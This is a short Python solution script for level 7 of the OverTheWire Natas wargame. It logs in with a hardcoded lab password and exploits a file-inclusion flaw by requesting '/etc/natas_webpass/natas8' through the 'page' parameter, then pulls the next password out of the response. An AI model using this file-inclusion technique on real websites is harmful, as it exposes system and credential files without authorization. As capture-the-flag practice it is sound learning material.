import re, requests
from bs4 import BeautifulSoup

username = "natas7"
password = "jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr"

url = 'http://' + username + '.natas.labs.overthewire.org/index.php'
auth = (username, password)
params = {"page":"/etc/natas_webpass/natas8"}


r = requests.get(url, auth=auth, params=params)
# print(r.headers)
# print(r.text)

print(re.findall('<br>\n(.*)\n\n<!-- hint: password for', r.text))
